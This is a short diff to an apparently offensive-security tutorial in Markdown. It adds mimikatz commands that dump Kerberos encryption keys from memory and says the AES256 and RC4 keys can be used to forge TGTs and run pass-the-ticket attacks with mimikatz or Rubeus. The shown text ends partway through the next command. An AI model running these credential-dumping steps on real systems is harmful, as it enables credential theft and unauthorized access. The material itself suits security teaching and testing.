@@ -20,5 +20,11 @@ First we need to extract Kerboros Keys by using mimikatz:
 ```
 mimikatz.exe
 privilege::debug
-sekurlsa::el
+sekurlsa::ekeys
+```
+We must pay attention to AES256_HMAC and RC4_HMAC keys, as we can use them to forge TGT and perfrom PTT attacks with either mimikatz or Rubeus
+
+-Using mimikatz:
+```
+sekurlsa
 ```
